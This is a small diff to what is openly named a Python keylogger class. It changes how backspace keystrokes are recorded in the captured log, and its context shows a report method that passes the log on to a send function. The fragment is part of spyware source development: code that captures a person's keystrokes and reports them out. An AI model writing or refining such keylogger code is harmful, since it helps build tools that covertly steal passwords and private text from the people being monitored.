@@ -30,8 +30,9 @@ class Keylogger:
 
         if key == "Key.backspace":
             self.log = self.log[:len(self.log)-1]
-        else:
-            self._appendlog(key)
+            key = ""
+            
+        self._appendlog(key)
 
     def _report(self):
         self._send_info(self.log)
